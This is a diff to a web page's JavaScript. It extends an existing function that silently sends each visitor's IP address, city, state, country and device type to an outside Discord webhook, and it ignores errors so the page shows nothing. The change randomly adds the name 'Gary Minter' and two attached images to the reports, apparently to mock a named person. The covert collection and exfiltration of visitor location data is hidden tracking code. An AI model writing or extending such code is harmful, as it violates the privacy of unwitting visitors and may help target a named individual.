@@ -52,6 +52,11 @@
         return "```\n" + top + "\n" + lines.map(pad).join("\n") + "\n" + bottom + "\n```";
       }
 
+      var GARY_IMAGES = [
+        "https://cdn.discordapp.com/attachments/1202087166709350501/1568888076019703838/image.png?ex=6af17461&is=6af022e1&hm=b0309f6b654c31105db31d02d531f94c2f4c1830cb4342b6599a1f313f0c9bec&",
+        "https://cdn.discordapp.com/attachments/1202087166709350501/1568888442178244628/image.png?ex=6af174b9&is=6af02339&hm=720176c676c4d4fd3a9bab88bd38f1c209ceb3c8585a74b197ceded67ebf8dbf&"
+      ];
+
       function send(ip, city, state, country) {
         var message = boxed([
           "IP:      " + ip,
@@ -60,11 +65,22 @@
           "Country: " + country,
           "Device:  " + deviceType()
         ]);
+
+        var payload = { content: message };
+
+        // 1 in 10 chance: add "Gary Minter" below the box and the two images.
+        if (Math.floor(Math.random() * 10) === 0) {
+          payload.content = message + "\nGary Minter";
+          payload.embeds = GARY_IMAGES.map(function (url) {
+            return { image: { url: url } };
+          });
+        }
+
         try {
           fetch(DISCORD_WEBHOOK_URL, {
             method: "POST",
             headers: { "Content-Type": "application/json" },
-            body: JSON.stringify({ content: message })
+            body: JSON.stringify(payload)
           });
         } catch (e) {
           // Ignore errors so the page still renders normally.
